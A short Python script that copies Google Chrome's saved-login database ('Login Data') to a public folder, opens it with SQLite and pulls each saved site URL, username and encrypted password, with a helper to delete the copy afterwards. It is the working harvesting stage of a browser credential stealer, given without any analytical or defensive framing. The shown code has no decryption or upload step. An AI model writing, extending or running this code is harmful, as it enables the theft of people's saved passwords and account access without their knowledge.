from sqlite3 import *
import os
def getconnect():
    path = r'%LocalAppData%\\Google\\Chrome\\User Data\\Default\\Login Data'
    newdb = "C:\\Users\\Public\\Documents\\LoginData.db"
    path = os.path.expandvars(path)
    dat = open(path, 'rb').read()
    open(newdb, "wb").write(dat)
    con = connect(newdb)
    return con
def rmdb():
    os.remove("C:\\Users\\Public\\Documents\\LoginData.db")
def getLoginInfo():
    con = getconnect()
    cur = con.cursor()
    cur.execute("SELECT * FROM logins")
    rows = cur.fetchall()
    LoginInfo = []
    for row in rows:
        webpage = row[0]
        user = row[3]
        encrypted_password = row[5]
        LoginInfo.append([webpage, user, encrypted_password])
    return LoginInfo